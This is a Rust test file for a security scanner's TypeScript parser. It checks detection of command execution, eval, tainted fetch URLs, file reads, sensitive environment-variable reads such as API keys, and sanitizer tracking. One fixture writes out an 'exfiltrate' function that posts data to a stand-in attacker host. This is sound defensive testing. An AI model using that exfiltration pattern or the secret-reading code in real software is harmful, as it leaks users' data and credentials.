use std::path::Path;

use super::*;
use crate::ir::ArgumentSource;

#[test]
fn detects_exec_with_param() {
    let code = r#"
import { exec } from "child_process";

function runCommand(command: string) {
    exec(command);
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.commands.len(), 1);
    assert!(matches!(
        parsed.commands[0].command_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[test]
fn detects_spawn_with_interpolation() {
    let code = r#"
function run(cmd: string) {
    exec(`${cmd} --flag`);
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.commands.len(), 1);
    assert!(matches!(
        parsed.commands[0].command_arg,
        ArgumentSource::Interpolated
    ));
}

#[test]
fn detects_fetch_with_param() {
    let code = r#"
async function fetchUrl(url: string) {
    const resp = await fetch(url);
    return resp.json();
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(matches!(
        parsed.network_operations[0].url_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[test]
fn safe_literal_url_not_flagged() {
    let code = r#"
async function getHealth() {
    const resp = await fetch("https://api.example.com/health");
    return resp.json();
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(matches!(
        parsed.network_operations[0].url_arg,
        ArgumentSource::Literal(_)
    ));
}

#[test]
fn detects_env_var_access() {
    let code = r#"
const apiKey = process.env["OPENAI_API_KEY"];
const secret = process.env.AWS_SECRET_ACCESS_KEY;
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.env_accesses.len(), 2);
    assert!(parsed.env_accesses[0].is_sensitive);
    assert!(parsed.env_accesses[1].is_sensitive);
}

#[test]
fn detects_eval() {
    let code = r#"
function execute(code: string) {
    eval(code);
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.dynamic_exec.len(), 1);
    assert!(matches!(
        parsed.dynamic_exec[0].code_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[test]
fn detects_file_operations() {
    let code = r#"
import fs from "fs";

function readConfig(path: string) {
    return fs.readFileSync(path, "utf-8");
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.file_operations.len(), 1);
    assert!(matches!(
        parsed.file_operations[0].path_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[test]
fn detects_arrow_function_params() {
    let code = r#"
const handler = async (url: string) => {
    const resp = await fetch(url);
    return resp.text();
};
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(matches!(
        parsed.network_operations[0].url_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[test]
fn detects_axios_post() {
    let code = r#"
async function exfiltrate(data: string) {
    await axios.post("https://evil.com/steal", { body: data });
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(parsed.network_operations[0].sends_data);
}

// ── Tests requiring tree-sitter AST (multi-line, TSX, accurate positions) ──

#[cfg(feature = "typescript")]
#[test]
fn detects_multiline_exec_call() {
    let code = r#"
function runCommand(command: string) {
    exec(
        command,
        { encoding: "utf-8" }
    );
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.commands.len(), 1);
    assert!(matches!(
        parsed.commands[0].command_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[cfg(feature = "typescript")]
#[test]
fn detects_multiline_fetch() {
    let code = r#"
async function sendData(url: string) {
    const resp = await fetch(
        url,
        {
            method: "POST",
            body: JSON.stringify({ key: "value" }),
        }
    );
    return resp.json();
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(matches!(
        parsed.network_operations[0].url_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[cfg(feature = "typescript")]
#[test]
fn detects_nested_callback_exec() {
    let code = r#"
function runCommand(command: string): Promise<string> {
    return new Promise((resolve, reject) => {
        exec(command, (error, stdout) => {
            if (error) reject(error);
            resolve(stdout);
        });
    });
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.commands.len(), 1);
    assert!(matches!(
        parsed.commands[0].command_arg,
        ArgumentSource::Parameter { .. }
    ));
}

#[cfg(feature = "typescript")]
#[test]
fn accurate_line_numbers() {
    let code = r#"
// line 2
// line 3
function dangerous(cmd: string) {
    exec(cmd);
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert_eq!(parsed.commands.len(), 1);
    // exec(cmd) is on line 5
    assert_eq!(parsed.commands[0].location.line, 5);
}

#[cfg(feature = "typescript")]
#[test]
fn handles_tsx_file() {
    let code = r#"
import React from "react";

const Component = ({ url }: { url: string }) => {
    const data = fetch(url);
    return <div>{data}</div>;
};
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("component.tsx"), code)
        .unwrap();
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(matches!(
        parsed.network_operations[0].url_arg,
        ArgumentSource::Parameter { .. }
    ));
}

// ── Cross-file support tests ──

#[test]
fn extracts_function_defs() {
    let code = r#"
export async function readFileContent(filePath: string) {
    return fs.readFile(filePath, "utf-8");
}

function internalHelper(x: number) {
    return x + 1;
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("lib.ts"), code)
        .unwrap();
    assert!(parsed.function_defs.len() >= 2);
    let exported = parsed
        .function_defs
        .iter()
        .find(|d| d.name == "readFileContent");
    assert!(exported.is_some());
    assert!(exported.unwrap().is_exported);
    assert_eq!(exported.unwrap().params, vec!["filePath"]);

    let internal = parsed
        .function_defs
        .iter()
        .find(|d| d.name == "internalHelper");
    assert!(internal.is_some());
    assert!(!internal.unwrap().is_exported);
}

#[test]
fn extracts_call_sites() {
    let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("index.ts"), code)
        .unwrap();
    assert!(!parsed.call_sites.is_empty());
    let rfc_call = parsed
        .call_sites
        .iter()
        .find(|cs| cs.callee == "readFileContent");
    assert!(rfc_call.is_some(), "Should find readFileContent call site");
}

#[test]
fn detects_sanitizer_assignment() {
    let code = r#"
async function handler(args: any) {
    const validPath = await validatePath(args.path);
    const content = await readFileContent(validPath);
    return content;
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("index.ts"), code)
        .unwrap();
    assert!(parsed.sanitized_vars.contains("validPath"));

    // The call to readFileContent(validPath) should classify validPath as Sanitized
    let rfc_call = parsed
        .call_sites
        .iter()
        .find(|cs| cs.callee == "readFileContent");
    assert!(rfc_call.is_some());
    let rfc = rfc_call.unwrap();
    assert!(!rfc.arguments.is_empty());
    assert!(
        matches!(&rfc.arguments[0], ArgumentSource::Sanitized { .. }),
        "validPath should be classified as Sanitized, got: {:?}",
        rfc.arguments[0]
    );
}

#[test]
fn sanitized_var_from_path_resolve() {
    let code = r#"
function processFile(rawPath: string) {
    const safePath = path.resolve(rawPath);
    fs.readFileSync(safePath, "utf-8");
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();
    assert!(parsed.sanitized_vars.contains("safePath"));
}

#[test]
fn url_parse_assignment_is_not_sanitized_for_ssrf() {
    let code = r#"
async function handler(args: { url: string }) {
    const parsedUrl = URL.parse(args.url);
    return fetch(parsedUrl);
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();

    assert!(!parsed.sanitized_vars.contains("parsedUrl"));
    assert_eq!(parsed.network_operations.len(), 1);
    assert!(
        parsed.network_operations[0].url_arg.is_tainted(),
        "URL.parse output must remain tainted for network sinks"
    );
}

#[test]
fn redaction_assignment_is_not_sanitized_for_file_paths() {
    let code = r#"
function redactSecret(value: string): string {
    return value.replace(/secret/g, "[REDACTED]");
}

function handler(args: { path: string }) {
    const redactedPath = redactSecret(args.path);
    return fs.readFileSync(redactedPath, "utf-8");
}
"#;
    let parsed = TypeScriptParser
        .parse_file(Path::new("test.ts"), code)
        .unwrap();

    assert!(!parsed.sanitized_vars.contains("redactedPath"));
    assert_eq!(parsed.file_operations.len(), 1);
    assert!(
        parsed.file_operations[0].path_arg.is_tainted(),
        "redaction output must remain tainted for file path sinks"
    );
}
